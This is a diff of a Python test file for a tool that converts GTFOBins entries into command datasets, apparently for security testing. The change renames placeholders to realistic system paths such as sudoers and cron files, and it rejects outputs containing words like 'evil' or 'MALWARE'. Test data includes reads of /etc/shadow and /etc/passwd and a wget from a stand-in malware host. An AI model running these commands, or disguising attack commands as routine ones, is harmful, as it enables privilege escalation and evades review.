@@ -49,7 +49,7 @@ class TestNormalizeCommand:
         """Normalize $TF temp file placeholder."""
         cmd = "cat $TF"
         result = normalize_command(cmd)
-        assert "/tmp/evil" in result
+        assert "/etc/sudoers.d/custom" in result
         assert "$TF" not in result
 
     def test_normalize_attacker_domain(self):
@@ -70,7 +70,7 @@ class TestNormalizeCommand:
         """Normalize /path/to/output-file placeholder."""
         cmd = "echo DATA > /path/to/output-file"
         result = normalize_command(cmd)
-        assert "/tmp/evil" in result
+        assert "/etc/cron.d/update" in result
         assert "/path/to/output-file" not in result
 
     def test_preserve_multiline_structure(self):
@@ -85,7 +85,7 @@ class TestNormalizeCommand:
         cmd = "echo /path/to/command | at now"
         result = normalize_command(cmd)
         assert "/path/to/command" not in result
-        assert "/tmp/evil.sh" in result
+        assert "/usr/local/bin/service-check" in result
 
     def test_normalize_path_to_dir(self):
         """Normalize /path/to/dir/ placeholder."""
@@ -93,6 +93,13 @@ class TestNormalizeCommand:
         result = normalize_command(cmd)
         assert "/path/to/dir/" not in result
         assert "/tmp/dir/" in result
+
+    def test_normalize_data_placeholder(self):
+        """Normalize DATA placeholder with base64 value."""
+        cmd = "echo DATA | base64 -d > /tmp/out"
+        result = normalize_command(cmd)
+        assert "c2VydmljZS1jb25maWc=" in result
+        assert result.startswith("echo c2VydmljZS1jb25maWc=")
 
 
 class TestParseGtfobinsFile:
@@ -116,8 +123,25 @@ functions:
         assert result[0]["category"] == "file-read"
         assert "shadow" in result[0]["command"]
 
-    def test_parse_excludes_shell_category(self, tmp_path):
+    def test_parse_excludes_suid_category(self, tmp_path):
         """Excluded categories are filtered out."""
+        yaml_content = """
+functions:
+  suid:
+    - code: ./binary -p
+  file-read:
+    - code: cat /etc/passwd
+"""
+        test_file = tmp_path / "binary"
+        test_file.write_text(yaml_content)
+
+        result = parse_gtfobins_file(test_file)
+
+        assert len(result) == 1
+        assert result[0]["category"] == "file-read"
+
+    def test_parse_includes_shell_category(self, tmp_path):
+        """Shell category is now included."""
         yaml_content = """
 functions:
   shell:
@@ -130,8 +154,10 @@ functions:
 
         result = parse_gtfobins_file(test_file)
 
-        assert len(result) == 1
-        assert result[0]["category"] == "file-read"
+        assert len(result) == 2
+        categories = {r["category"] for r in result}
+        assert "shell" in categories
+        assert "file-read" in categories
 
     def test_parse_skips_alias_files(self, tmp_path):
         """Alias files (no functions) are skipped."""
@@ -232,9 +258,57 @@ class TestValidateOutput:
                 "categories_excluded": list(EXCLUDED_CATEGORIES),
                 "total_commands": 1,
             },
-            "commands": [{"command": "/bin/sh", "binary": "bash", "category": "shell"}],
+            "commands": [{"command": "./binary -p", "binary": "binary", "category": "suid"}],
         }
         assert validate_output(data) is False
+
+    def test_banned_name_fails(self):
+        """Command containing banned name fails validation."""
+        data = {
+            "metadata": {
+                "source": "GTFOBins",
+                "extraction_date": "2026-02-03",
+                "categories_included": list(INCLUDED_CATEGORIES),
+                "categories_excluded": list(EXCLUDED_CATEGORIES),
+                "total_commands": 1,
+            },
+            "commands": [
+                {"command": "cat /tmp/evil", "binary": "cat", "category": "file-read"}
+            ],
+        }
+        assert validate_output(data) is False
+
+    def test_banned_name_case_insensitive(self):
+        """Banned name check is case-insensitive."""
+        data = {
+            "metadata": {
+                "source": "GTFOBins",
+                "extraction_date": "2026-02-03",
+                "categories_included": list(INCLUDED_CATEGORIES),
+                "categories_excluded": list(EXCLUDED_CATEGORIES),
+                "total_commands": 1,
+            },
+            "commands": [
+                {"command": "wget http://10.0.0.1/MALWARE", "binary": "wget", "category": "download"}
+            ],
+        }
+        assert validate_output(data) is False
+
+    def test_no_banned_names_passes(self):
+        """Commands without banned names pass validation."""
+        data = {
+            "metadata": {
+                "source": "GTFOBins",
+                "extraction_date": "2026-02-03",
+                "categories_included": list(INCLUDED_CATEGORIES),
+                "categories_excluded": list(EXCLUDED_CATEGORIES),
+                "total_commands": 1,
+            },
+            "commands": [
+                {"command": "cat /etc/shadow", "binary": "cat", "category": "file-read"}
+            ],
+        }
+        assert validate_output(data) is True
 
     def test_count_mismatch_fails(self):
         """Count mismatch fails validation."""
